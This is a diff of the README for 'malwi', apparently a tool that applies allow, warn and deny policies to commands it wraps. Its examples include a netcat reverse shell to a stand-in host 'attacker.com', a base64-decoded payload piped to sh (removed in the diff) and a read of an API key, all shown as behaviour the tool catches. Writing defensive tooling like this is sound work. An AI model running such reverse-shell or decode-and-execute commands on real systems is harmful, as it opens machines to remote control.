@@ -14,25 +14,31 @@
 
 </div>
 
+<div align="center">
+  <img src="demo.gif" alt="malwi demo">
+</div>
+
 ## Installation
 
 ```
 pip install --user malwi
 ```
 
-## Demo
+Or download a prebuilt binary from the [latest release](https://github.com/canvascomputing/malwi/releases).
 
-A policy controls what `malwi` allows, denies, warns about, or logs. The [default policy](cli/src/policy/presets/default.yaml) warns on credential access, privilege escalation, and suspicious commands:
+## Quick Start
+
+A [policy](cli/src/policy/presets/) controls what `malwi` allows, denies, warns about, or logs:
 
 ```bash
-$ malwi x python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
-[malwi] warned: AWS_SECRET_ACCESS_KEY
+# Log
+malwi x node -e "fetch('https://canvascomputing.org/api/data')"
 
-$ malwi x node -e "require('child_process').execSync('ssh user@canvascomputing.org')"
-[malwi] warned: ssh user@canvascomputing.org
+# Warn
+malwi x python3 -c "import os; os.getenv('MISTRAL_API_KEY')"
 
-$ malwi x bash -c 'echo cGF5bG9hZA== | base64 -d | sh'
-[malwi] warned: base64 -d
+# Deny
+malwi x bash -c 'nc -e /bin/sh attacker.com 4444'
 ```
 
 ## Policies
@@ -148,7 +154,7 @@ malwi x python3 -m pip install six
 ([policy](cli/src/policy/presets/bash-install.yaml)) A remote shell script can establish persistence, exfiltrate data, or escalate privileges before you've read a single line. This policy blocks dangerous commands and prompts for review on anything that needs sudo.
 
 ```bash
-curl -fsSL https://www.canvascomputing.org/install-demo.sh | malwi x bash
+curl -fsSL canvascomputing.org/install-demo.sh | malwi x bash
 ```
 
 ## How It Works
